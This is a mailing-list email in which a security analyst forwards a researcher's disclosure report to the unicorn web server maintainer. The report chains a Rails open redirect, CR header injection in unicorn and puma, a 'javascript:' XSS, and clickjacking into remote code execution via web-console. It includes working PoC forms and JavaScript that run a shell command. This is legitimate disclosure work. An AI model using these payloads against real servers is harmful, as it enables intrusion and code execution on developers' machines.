@@ -1,0 +1,508 @@
+Return-Path: <sams@snyk.io>
+X-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on dcvr.yhbt.net
+X-Spam-Level: 
+X-Spam-Status: No, score=-3.2 required=3.0 tests=BAYES_00,DKIM_SIGNED,
+	DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_BLOCKED,
+	SPF_HELO_NONE,SPF_PASS,WEIRD_PORT shortcircuit=no autolearn=ham
+	autolearn_force=no version=3.4.2
+Received: from mail-ej1-x62d.google.com (mail-ej1-x62d.google.com [IPv6:2a00:1450:4864:20::62d])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
+	(No client certificate requested)
+	by dcvr.yhbt.net (Postfix) with ESMTPS id 659121F934
+	for <unicorn-public@yhbt.net>; Wed, 13 Jan 2021 23:20:20 +0000 (UTC)
+Received: by mail-ej1-x62d.google.com with SMTP id e18so5476077ejt.12
+        for <unicorn-public@yhbt.net>; Wed, 13 Jan 2021 15:20:20 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=snyk.io; s=google;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
+         :cc:content-transfer-encoding;
+        bh=uBqUfuRO4XXBT5GH0oS7150ejKBiLDdnTvy3CGFlOvY=;
+        b=hbhVhjYUUNwtN09rDfjmK6AbyZ1lH9c71oV2VIRYwjfL90ZXJ8kltcleKgIHMDJIIz
+         jLB5IQ/tMux6ZyCJQACwkW+JArqJB2CGW+FsRrSMLIEnTQ9C338+FzsON5KityJTSczL
+         HQ5rkcG4QI+kztsgZ6XAmfWprzI0Pg8NX5Ih/AuffxHrBglXns/knl9RJcg74HEGuguh
+         6rmyRszokOc9XquYaUmenCP/mSaTnK9B9wBhqY+yBdVrWRBG8D/dS3dBnsD5gE2Y/7oy
+         +gCZreprYxXdEJ9mzIWff4v+PQUWKxeA8yonxps9WWUK2K5ZbRNCQ5uMeOdwJrb/vYwC
+         95kA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to:cc:content-transfer-encoding;
+        bh=uBqUfuRO4XXBT5GH0oS7150ejKBiLDdnTvy3CGFlOvY=;
+        b=YckZ9ouGSSN/wVxwYqpznaB37HBp0zSwcM0KggQv/B+VEPDqySQSCAc3Oc9qKKGOXB
+         U/TXRD6B7A1nKZbl/TbmWG9cmUWuLwQKG85RUrh+Wv8PajxwypgjmDInadj3Zzb0jNH9
+         8/XjbEe0H5oNynCbGxg/Iy3uyfuLzpmVhmqmkMhxfe0Waxh+QVboGL02YNXso6Gs6Lv4
+         0i3soAzpVmxNa82tsk6q3ihgqyouseOgQboBmy9lZz5BA6iNIDPk7gihkODZ72AfJtzI
+         ZhmsI2ug47dWFZ4aMtfWOo8wmcK3t5DluiZkysNoGKrLL8/7LUx3Zrw+mBdV4hWZnnG+
+         uGkA==
+X-Gm-Message-State: AOAM533Z/WZPB59tNPzu5DpVTC7AOSvWz09SHrYbWdErOmH63zV7xpJt
+	SLxfHlhqOAB14wxByjMKuHrqtRmOrTHcBK5TNHYeb7a9NzpKcQ==
+X-Google-Smtp-Source: ABdhPJwq9skC/dLvT6ALm14y5+O6fsh159uYdPp8kOc3CL/g8K2DZB4GTjSWCf0ozrEbpcBXCLDBQNr5J6ydUauyr0E=
+X-Received: by 2002:a17:907:175c:: with SMTP id lf28mr2939019ejc.110.1610580017094;
+ Wed, 13 Jan 2021 15:20:17 -0800 (PST)
+MIME-Version: 1.0
+References: <20201126115902.GA8883@dcvr> <20210106175338.GA10985@dcvr>
+In-Reply-To: <20210106175338.GA10985@dcvr>
+From: Sam Sanoop <sams@snyk.io>
+Date: Wed, 13 Jan 2021 23:20:06 +0000
+Message-ID: <CAEQPCYLpr-w2K9eg-nnFaKgdDBvVU3h3+1bs-xWEC6CwTrDdzQ@mail.gmail.com>
+Subject: Re: [RFC] http_response: ignore invalid header response characters
+To: Eric Wong <bofh@yhbt.net>
+Cc: unicorn-public@yhbt.net
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+List-Id: <unicorn-public.yhbt.net>
+
+Hi, The researcher didn=E2=80=99t test it with Ngnix, his configuration
+according to the report was
+
+server: unicorn (<=3D latest)
+Rails version: 6.0.0 < rails < 6.0.3.2
+RAILS_ENV: production
+
+
+But reading http://blog.volema.com/nginx-insecurities.html, CRLF can
+be allowed if a user is using $uri variables within their NGINX
+config. So conditions within NGNIX would need to be met.
+
+Regarding the hackerone report, here is a txt version of the report:
+
+
+ooooooo_q-----------------
+
+Hello,
+I was looking at the change log
+(https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed7=
+9fc2)
+for CVE-2020-8185 and found another problem existed.
+
+https://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch=
+/middleware/actionable_exceptions.rb#L21
+
+  redirect_to request.params[:location]
+end
+
+private
+  def actionable_request?(request)
+    request.show_exceptions? && request.post? && request.path =3D=3D endpoi=
+nt
+  end
+
+  def redirect_to(location)
+    body =3D "<html><body>You are being <a
+href=3D\"#{ERB::Util.unwrapped_html_escape(location)}\">redirected</a>.</bo=
+dy></html>"
+
+    [302, {
+      "Content-Type" =3D> "text/html; charset=3D#{Response.default_charset}=
+",
+      "Content-Length" =3D> body.bytesize.to_s,
+      "Location" =3D> location,
+    }, [body]]
+  end
+There was an open redirect issue because the request parameter
+location was not validated.
+In 6.0.3.2, since the condition of actionable_request? has changed,
+this problem is less likely to occur.
+
+PoC
+1. Prepare server
+Prepare an attackable 6.0.3.1 version of Rails server
+
+=E2=9D=AF rails -v
+Rails 6.0.3.1
+
+=E2=9D=AF RAILS_ENV=3Dproduction rails s
+...
+* Environment: production
+* Listening on tcp://0.0.0.0:3000
+2. Attack server
+Prepare the server for attack on another port.
+
+<form method=3D"post"
+action=3D"http://localhost:3000/rails/actions?error=3DActiveRecord::Pending=
+MigrationError&action=3DRun%20pending%20migrations&location=3Dhttps://www.h=
+ackerone.com/">
+    <button type=3D"submit">click!</button>
+</form>
+python3 -m http.server 8000
+3. Open browser
+Open the http://localhost:8000/attack.html url in your browser and
+click the button.
+Redirect to https://www.hackerone.com/ url.
+
+
+
+Impact
+It will be fixed with 6.0.3.2 as with
+CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM=
+0),
+but I think it is necessary to announce it again because the range of
+influence is different.
+
+This open redirect changes from POST method to Get Method, so it may
+be difficult to use for phishing.On the other hand, it may affect
+bypass of referrer check or SSRF.
+
+
+
+ooooooo_q------
+
+I thought about it after submitting the report, but even in 6.0.3.2,
+/rails/actions is available in developer mode.
+If it was started in development mode, the request will be accepted by
+CSRF, so the same as CVE-2020-8185 still exists.
+I think it's better to take CSRF measures in /rails/actions.
+
+Vulnerabilities, versions and modes
+6.0.3.1 (production, development)
+run pending migrations (CVE-2020-8185)
+open redirect
+6.0.3.2 (development)
+run pending migrations (by CSRF)
+open redirect (by CSRF)
+6.0.3.2 (production)
+no problem
+
+
+tenderloveRuby on Rails staff -------
+
+This seems like a good improvement, but I don't think we need to treat
+it as a security issue. If you agree, would you mind filing an issue
+on the Rails GitHub issues?
+Thank you!
+
+
+ooooooo_q------
+
+@tenderlove
+I'm sorry to reply late.
+
+While researching unicorn, I found this report to lead to other vulnerabili=
+ties.
+
+Open Redirect to HTTP header injection
+Response header injection vulnerability exists in versions of puma below 4.=
+3.2.
+https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v
+I have confirmed that unicorn is also enable of response header injection.
+
+HTTP header injection is possible by including \r in the redirect URL
+using these.
+
+PoC
+> escape("\rSet-cookie:a=3Da")
+"%0DSet-cookie%3Aa%3Da"
+This is the html used on the attack server.
+
+<form method=3D"post"
+action=3D"http://localhost:3000/rails/actions?error=3DActiveRecord::Pending=
+MigrationError&action=3DRun%20pending%20migrations&location=3D%0DSet-cookie=
+%3Aa%3Da">
+  <button type=3D"submit">set cookie</button>
+</form>
+When click this button, the response header will be as follows.
+
+Location:
+Set-cookie: a=3Da
+If you open the developer tools in your browser, you'll see that the
+cookie value is set.
+
+When I tried it, puma and unicorn can insert only the character of \r,
+and it seems that \n cannot be inserted.
+Therefore, it seems that response body injection that leads to XSS
+cannot be performed.
+
+On the other hand, in passenger, it became an error when \r was in the
+value of the header.
+
+XSS trick
+While trying out \r on the response header, I noticed a strange thing.
+If \r is at the beginning, it means that the browser is not redirected
+and javascript: can be used in the URL of the response link.
+When specify \rjavascript:alert(location) as the redirect destination,
+the HTML of the response will be as follows.
+
+<html><body>You are being <a href=3D"
+javascript:alert(location)">redirected</a>.</body></html>
+The \r character is ignored in html, so javascript:alert(location) is
+executed when the user clicks the link.
+
+This is a separate issue from HTTP header injection and depends on how
+the server handles the value of \r.
+In puma and unicorn below 4.3.2, \r is used for HTTP header injection,
+so no error occurs.
+With puma 4.3.3 or later, if there is a line containing \r, it does
+not become an error and it can be executed because that line is
+excluded.
+On the other hand, the error occurred in passenger.
+
+As a further issue, the headers in this response are
+middleware-specific and therefore do not include the security headers
+Rails is outputting.
+Since X-Frame-Options is not included, click jacking is possible.
+No output even if CSP is set in the application.
+
+By using click jacking in combination with these, it is easy to
+generate XSS that requires user click.
+
+PoC
+Inserting the execution code from another site using the name of the iframe=
+.
+
+This PoC will also run in production mode if 6.0.0 < rails < 6.0.3.2.
+It can be run with the latest puma and unicorn.
+
+If it is development mode, it can be executed even after 6.0.3.2
+
+child.html
+<form method=3D"post"
+action=3D"http://localhost:3000/rails/actions?error=3DActiveRecord::Pending=
+MigrationError&action=3DRun%20pending%20migrations&location=3D%0Djavascript=
+%3Aeval%28name%29">
+    <button type=3D"submit">location is escape("\rjavascript:eval(name)")</=
+button>
+</form>
+<script type=3D"text/javascript">
+    document.querySelector("button").click();
+</script>
+click_jacking.html
+<html>
+<style>
+iframe{
+    position: absolute;
+    z-index: 1;
+    opacity: 0.3;
+}
+div{
+    position: absolute;
+    top: 20px;
+    left: 130px;
+}
+button {
+    width: 80px;
+    height: 26px;
+    cursor: pointer;
+}
+</style>
+<body>
+    <iframe src=3D./child.html name=3D"alert(location)" height=3D40></ifram=
+e>
+    <div>
+        <button>click!!</button>
+    </div>
+</body>
+</html>
+
+
+
+XSS to RCE
+When XSS exists in development mode, I confirmed that calling the
+method of web-cosole leads to RCE.
+RCE is possible by inducing users who are developing Rails
+applications to click on the trap site.
+
+PoC
+var iframe =3D document.createElement("iframe");
+iframe.src =3D "/not_found";
+document.body.appendChild(iframe);
+setTimeout(()=3D>fetch("/__web_console/repl_sessions/" +
+iframe.contentDocument.querySelector("#console").dataset.sessionId, {
+    method: "PUT",
+    headers: {
+        "Content-Type": "application/json",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    body: JSON.stringify({
+        input: "`touch from_web_console`"
+    })
+}), 2000)
+<iframe src=3D./child.html name=3D'var iframe =3D
+document.createElement("iframe");iframe.src =3D
+"/not_found";document.body.appendChild(iframe);setTimeout(()=3D>
+fetch("/__web_console/repl_sessions/"+iframe.contentDocument.querySelector(=
+"#console").dataset.sessionId,
+{method: "PUT",headers: {"Content-Type":
+"application/json","X-Requested-With": "XMLHttpRequest"},body:
+JSON.stringify({input: "`touch from_web_console`"})}),2000)'/>
+When this is run, a file from from_web_console will be generated.
+
+Vulnerabilities and conditions
+Run pending migrations (CVE-2020-8185)
+server: any
+
+Rails version: 6.0.0 < rails < 6.0.3.2
+RAILS_ENV: production
+
+Run pending migrations by CSRF
+server: any
+
+Rails version: 6.0.0 < (not fixed)
+RAILS_ENV: development
+
+Open redirect (from POST method)
+server: any
+
+Rails version: 6.0.0 < rails < 6.0.3.2
+RAILS_ENV: production
+
+or
+
+Rails version: 6.0.0 < (not fixed)
+RAILS_ENV: development
+
+HTTP header injection
+server: unicorn (<=3D latest) or puma (< 4.3.2)
+
+Rails version: 6.0.0 < rails < 6.0.3.2
+RAILS_ENV: production
+
+or
+
+Rails version: 6.0.0 < (not fixed)
+RAILS_ENV: development
+
+XSS (need user click)
+server: unicorn (<=3D latest) or puma (<=3D latest)
+
+Railse version: 6.0.0 < rails < 6.0.3.2
+RAILS_ENV: production
+
+or
+
+Railse version: 6.0.0 < (not fixed)
+RAILS_ENV: development
+
+RCE (from XSS)
+server: unicorn (<=3D latest) or puma (<=3D latest)
+Railse version: 6.0.0 < (not fixed)
+RAILS_ENV: development
+
+
+
+ooooooo_q------
+
+When I tried it, puma and unicorn can insert only the character of \r,
+and it seems that \n cannot be inserted.
+Makes sense. This seems like a security vulnerability in Puma / Unicorn.
+This is a separate issue from HTTP header injection and depends on how
+the server handles the value of \r.
+I'm not sure exactly which servers are vulnerable (this is too
+confusing for me =F0=9F=98=94), but whatever handles generating the respons=
+e
+page shouldn't allow \r at the beginning of the href like that.
+So this needs to check that location is a url (http or https).
+I don't think we need to set the security policy for the redirect page
+if we prevent the javascript: location from the href.
+How does this patch look?
+
+On Wed, Jan 6, 2021 at 5:53 PM Eric Wong <bofh@yhbt.net> wrote:
+>
+> Sam Sanoop <sams@snyk.io> wrote:
+> > Hi Eric,
+>
+> cf. https://yhbt.net/unicorn-public/20201126115902.GA8883@dcvr/
+> (private followup <CAEQPCYJJdriMQyDNXimCS_kBrc_=3DDxhxJ66YdJmCe7ZXr-Zbvg@=
+mail.gmail.com>)
+>
+> Hi Sam, I'm moving this to the public list.  Please keep
+> unicorn-public@yhbt.net Cc-ed (no need to quote, archives are
+> public and mirrored to several places).
+>
+> > I wanted to bring this up again. I spoke with the researcher
+> > (@ooooooo_q) who disclosed this issue to us. He released the full
+> > details including the HackerOne report pubclily which provided more
+> > clarity about this issue. That can be read here:
+> > https://hackerone.com/reports/904059#activity-8945588
+>
+> Note: I can't read anything on hackerone due to the JavaScript
+> requirement.  If somebody can copy the text here, that'd be
+> great.
+>
+> > That report was initially disclosed to the Ruby on Rails maintainers.
+> > In certain conditions, he was also able to leverage Puma and Unicorn
+> > to exploit the issues mentioned on the report. The issues which
+> > related to Unicorn were:
+> >
+> > * Open Redirect to HTTP header injection - (including \r in the redirec=
+t URL)
+> > * A user interaction XSS  - Which leverages
+> > \rjavascript:alert(location) as the redirect destination
+>
+> Does this happen when unicorn is behind nginx?
+>
+> unicorn was always designed to run behind nginx and falls over badly
+> without it (trivially DoS-ed via slowloris)
+>
+> > Reading that advisory, I see this more of an issue now. He has
+> > leveraged Unicorn and Puma along with Rails to demonstrate some of the
+> > proof of concepts. Under the section Vulnerabilities and conditions of
+> > the report, he has specified different conditions and configurations
+> > which allow for this vector.
+> >
+> > I agree with Aaron Patterson's (Rails Staff) decision on that report,
+> > this should be fixed in Unicorn and Puma directly, and Puma has
+> > already fixed this and issued an advisory:
+> > https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v.
+> >
+> > I believe there is enough of a risk to fix this issue. What do you thin=
+k?
+>
+> While we follow puma on some things (as in recent non-rack
+> features), I'm not sure if this affects unicorn the same way it
+> affects puma and other servers (that are supported without nginx).
+>
+> Fwiw, I've been against client-side JavaScript for a decade, now.
+> Libre license or not; the complexity of JS gives us a never-ending
+> stream of vulnerabilities, wasted RAM, CPU cycles, and bandwidth
+> use from constant software updates needed to continue the game of
+> whack-a-mole.
+>
+> rest of thread below (top-posting corrected):
+>
+> > > On Sun, Jan 3, 2021 at 10:20 PM Eric Wong <bofh@yhbt.net> wrote:
+> > > >
+> > > > Sam Sanoop <sams@snyk.io> wrote:
+> > > > > Hey Eric,
+> > > > >
+> > > > > Happy New Year. I want to follow up on the [RFC] http_response: i=
+gnore
+> > > > > invalid header response character RFC for the CRLF injection we s=
+poke
+> > > > > about previously. I wanted to know what would be the timeline for=
+ your
+> > > > > patch to get merged and what additional steps there are before th=
+at
+> > > > > can happen.
+> > > >
+> > > > Hi Sam, honestly I have no idea if it's even necessary...
+> > > > I've had no feedback since 2020-11-26:
+> > > >   https://yhbt.net/unicorn-public/20201126115902.GA8883@dcvr/
+> > > >
+> > > > Meanwhile 5.8.0 was released 2020-12-24 with a feature somebody
+> > > > actually cared about.
+> > > >
+> > > > Again, unicorn falls over without nginx in front of it anyways,
+> > > > so maybe nginx already guards against this and extra code is
+> > > > unnecessary on my end.
+> >
+> > On Sun, Jan 3, 2021 at 11:03 PM Sam Sanoop <sams@snyk.io> wrote:
+> > >
+> > > Hey Eric,
+> > >
+> > > No problem, I understand. Since the injection here is happening withi=
+n
+> > > the response, I am not convinced if this is exploitable as well. I
+> > > have let the reporter of this issue know what your stance is. I
+> > > mentioned if he can provide a better Proof of Concept where this is
+> > > exploitable in the context of a http request, and look into this a bi=
+t
+> > > further, we can open up discussion again, or else, this is not worth
+> > > fixing.
+
+
+
+--=20
+
+Sam Sanoop
+Security Analyst
